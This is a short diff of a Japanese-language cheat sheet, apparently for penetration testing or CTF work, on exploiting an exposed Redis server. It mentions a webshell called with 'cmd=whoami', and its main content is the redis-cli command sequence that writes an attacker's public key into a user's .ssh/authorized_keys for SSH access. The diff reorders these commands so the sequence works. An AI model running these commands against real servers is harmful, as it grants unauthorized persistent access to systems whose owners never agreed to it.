@@ -33,9 +33,10 @@ save # /webshell.php?cmd=whoami
 2. sshの公開鍵の登録
 ```bash
 config set dir <ユーザーのホームディレクトリ>/.ssh
-config set dbfilename authorized_keys
 # ターミナル
 (sudo echo -e '\n'; cat <公開鍵>; echo -e '\n') > pub_key.txt
 cat pub_key.txt | redis-cli -h <ターゲット> -x set ssh_key
-redis-cli -h <ターゲット> -x save
+redis-cli -h <ターゲット>
+config set dbfilename authorized_keys
+save
 ```
